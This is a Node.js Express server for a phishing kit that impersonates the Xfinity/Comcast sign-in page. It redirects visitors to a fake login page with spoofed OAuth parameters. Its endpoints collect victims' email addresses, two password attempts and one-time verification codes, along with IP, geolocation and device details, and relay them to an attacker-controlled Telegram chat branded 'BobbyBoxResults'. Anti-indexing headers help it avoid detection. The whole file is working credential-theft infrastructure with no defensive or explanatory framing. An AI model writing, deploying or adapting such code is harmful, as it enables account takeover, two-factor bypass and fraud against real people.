import express from 'express';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());

// --- Security Headers (bot-protection & anti-indexing) ---
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Referrer-Policy', 'same-origin');
  res.setHeader('Permissions-Policy', 'interest-cohort=()');
  res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet, noimageindex');
  next();
});

// --- Telegram API Configuration ---
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const FETCH_TIMEOUT = 15000;

const createTimeoutSignal = (ms) => {
  const controller = new AbortController();
  setTimeout(() => controller.abort(), ms);
  return controller.signal;
};

const getClientIp = (req) => {
  return (
    req.headers['x-forwarded-for'] ||
    req.headers['x-real-ip'] ||
    req.headers['cf-connecting-ip'] ||
    req.socket.remoteAddress ||
    'Unknown'
  ).toString().split(',')[0].trim();
};

const getIpAndLocation = async (ip) => {
  const location = { country: 'Unknown', regionName: 'Unknown' };
  if (ip === 'Unknown' || ip === '127.0.0.1' || ip === '::1') return location;
  try {
    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,query`, {
      signal: createTimeoutSignal(3000),
    });
    if (geoResponse.ok) {
      const geoJson = await geoResponse.json();
      location.country = geoJson.country || 'Unknown';
      location.regionName = geoJson.regionName || 'Unknown';
    }
  } catch (e) {
    console.error(`Geolocation lookup for IP ${ip} failed:`, e.message);
  }
  return location;
};

const getDeviceDetails = (userAgent) => {
  return {
    deviceType: /Mobile|Android|iPhone|iPad/i.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop',
    browser: 'Browser',
    os: 'OS',
  };
};

// Try to use ua-parser-js if available
let UAParser;
import('ua-parser-js').then(mod => {
  UAParser = mod.UAParser || mod.default || mod;
}).catch(() => {
  // ua-parser-js not available, use basic detection
});

const getDeviceDetailsWithParser = (userAgent) => {
  if (UAParser) {
    const uaParser = new UAParser(userAgent || '');
    const browser = uaParser.getBrowser();
    const os = uaParser.getOS();
    return {
      deviceType: /Mobile|Android|iPhone|iPad/i.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop',
      browser: browser.name ? `${browser.name} ${browser.version || ''}`.trim() : 'Unknown Browser',
      os: os.name ? `${os.name} ${os.version || ''}`.trim() : 'Unknown OS',
    };
  }
  return getDeviceDetails(userAgent);
};

const escapeHtml = (text) => {
  if (text === null || text === undefined) return 'N/A';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
};

const composeCredentialsMessage = (data) => {
  const {
    email, provider, firstAttemptPassword, secondAttemptPassword,
    clientIP, location, deviceDetails, timestamp, sessionId,
  } = data;

  const safeEmail = escapeHtml(email || 'Not captured');
  const safeFirstPw = escapeHtml(firstAttemptPassword);
  const safeSecondPw = escapeHtml(secondAttemptPassword);
  const safeProvider = escapeHtml(provider || 'Xfinity');
  const safeIP = escapeHtml(clientIP);
  const safeRegion = escapeHtml(location.regionName);
  const safeCountry = escapeHtml(location.country);
  const safeOS = escapeHtml(deviceDetails.os);
  const safeBrowser = escapeHtml(deviceDetails.browser);
  const safeDevice = escapeHtml(deviceDetails.deviceType);
  const safeSessionId = escapeHtml(sessionId);

  const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
    year: 'numeric', month: 'short', day: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    timeZone: 'UTC', hour12: true
  }) + ' UTC';

  return `<b>🔐 BobbyBoxResults - Credentials 🔐</b>

<b>ACCOUNT DETAILS</b>
📧 Email: ${safeEmail}
🏢 Provider: <b>${safeProvider}</b>
🔑 First (invalid): ${safeFirstPw}
🔑 Second (valid): ${safeSecondPw}

<b>DEVICE &amp; LOCATION</b>
📍 IP Address: ${safeIP}
🌍 Location: <b>${safeRegion}, ${safeCountry}</b>
💻 OS: <b>${safeOS}</b>
🌐 Browser: <b>${safeBrowser}</b>
🖥️ Device Type: <b>${safeDevice}</b>

<b>SESSION INFO</b>
🕒 Timestamp: <b>${formattedTimestamp}</b>
🆔 Session ID: ${safeSessionId}`;
};

const composeOtpMessage = (data) => {
  const { otp, session } = data;
  const { email, sessionId } = session || {};

  const safeOtp = escapeHtml(otp);
  const safeEmail = escapeHtml(email || 'N/A');
  const safeSessionId = escapeHtml(sessionId);

  const formattedTimestamp = new Date().toLocaleString('en-US', {
    year: 'numeric', month: 'short', day: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    timeZone: 'UTC', hour12: true
  }) + ' UTC';

  return `<b>🔑 BobbyBoxResults - OTP Code 🔑</b>

<b>VERIFICATION CODE</b>
🔢 OTP Code: ${safeOtp}

<b>ASSOCIATED SESSION</b>
📧 Email: ${safeEmail}
🆔 Session ID: ${safeSessionId}

<b>SUBMITTED AT</b>
🕒 Timestamp: <b>${formattedTimestamp}</b>`;
};

// --- Simple rate limiter ---
const rateLimitMap = new Map();
const RATE_LIMIT_WINDOW = 60 * 1000; // 1 minute
const RATE_LIMIT_MAX = 10; // max requests per window per IP

const rateLimit = (req, res, next) => {
  const ip = getClientIp(req);
  const now = Date.now();
  const entry = rateLimitMap.get(ip);

  if (!entry || now - entry.start > RATE_LIMIT_WINDOW) {
    rateLimitMap.set(ip, { start: now, count: 1 });
    return next();
  }

  entry.count++;
  if (entry.count > RATE_LIMIT_MAX) {
    return res.status(429).json({ error: 'Too many requests.' });
  }
  return next();
};

// --- API Routes ---

// Credentials-only endpoint
app.post('/api/sendTelegram', rateLimit, async (req, res) => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('FATAL: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars.');
    return res.status(500).json({ success: false, message: 'Server misconfiguration.' });
  }

  try {
    const data = req.body;

    // Validate: this endpoint handles credentials ONLY.
    if (data.otp || !data.email || !data.firstAttemptPassword) {
      return res.status(400).json({ error: 'Invalid payload for credentials endpoint. Use /api/sendOtp for OTP submissions.' });
    }

    const clientIP = getClientIp(req);
    const location = await getIpAndLocation(clientIP);
    const deviceDetails = getDeviceDetailsWithParser(data.userAgent);
    const sessionId = data.sessionId || Math.random().toString(36).substring(2, 15);
    const messageData = { ...data, clientIP, location, deviceDetails, sessionId };
    const message = composeCredentialsMessage(messageData);

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      signal: createTimeoutSignal(FETCH_TIMEOUT),
    });

    if (!telegramResponse.ok) {
      const errorResult = await telegramResponse.json().catch(() => ({ description: 'Failed to parse Telegram error response.' }));
      console.error('Telegram API Error:', errorResult.description);
      return res.status(502).json({ success: false, error: 'Failed to send message.' });
    }

    return res.json({ success: true, sessionId: data?.sessionId });
  } catch (error) {
    console.error('Function execution error:', error.message);
    return res.status(500).json({ error: 'An internal server error occurred.' });
  }
});

// Separate OTP-only endpoint
app.post('/api/sendOtp', rateLimit, async (req, res) => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('FATAL: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars.');
    return res.status(500).json({ success: false, message: 'Server misconfiguration.' });
  }

  try {
    const body = req.body;

    // Validate: this endpoint handles OTP ONLY.
    if (!body.otp) {
      return res.status(400).json({ error: 'Invalid payload for OTP endpoint. Missing otp field.' });
    }
    if (body.firstAttemptPassword || body.secondAttemptPassword) {
      return res.status(400).json({ error: 'Invalid payload for OTP endpoint. Use /api/sendTelegram for credentials.' });
    }

    const message = composeOtpMessage(body);

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      signal: createTimeoutSignal(FETCH_TIMEOUT),
    });

    if (!telegramResponse.ok) {
      const errorResult = await telegramResponse.json().catch(() => ({ description: 'Failed to parse Telegram error response.' }));
      console.error('Telegram API Error:', errorResult.description);
      return res.status(502).json({ success: false, error: 'Failed to send OTP message.' });
    }

    return res.json({ success: true });
  } catch (error) {
    console.error('sendOtp error:', error.message);
    return res.status(500).json({ error: 'An internal server error occurred.' });
  }
});

// --- Static File Serving ---
const distPath = join(__dirname, 'dist');

// Redirect root to the Xfinity login page with long OAuth-style query params
app.get('/', (req, res) => {
  res.redirect(302, '/login.html?r=comcast.net&s=oauth&continue=https%3A%2F%2Foauth.xfinity.com%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3Dmy-account-web%26redirect_uri%3Dhttps%253A%252F%252Fcustomer.xfinity.com%252Foauth%252Fcallback%26state%3Dhttps%253A%252F%252Fcustomer.xfinity.com%252Foverview%26response%3D1&reqId=b4f27a31-8c9e-4d1b-a5f6-3e7d2c8b9a01&ui_style=light&lang=en');
});

// Serve static files from dist/ with correct MIME types for .js.download files
app.use(express.static(distPath, {
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.js.download')) {
      res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    }
  },
}));

// SPA fallback - for /password, /otp and other React routes
app.get('*', (req, res) => {
  // If the request is for a file that exists in dist, it was already served by express.static
  // Otherwise, serve index.html for the React SPA to handle client-side routing
  res.sendFile(join(distPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
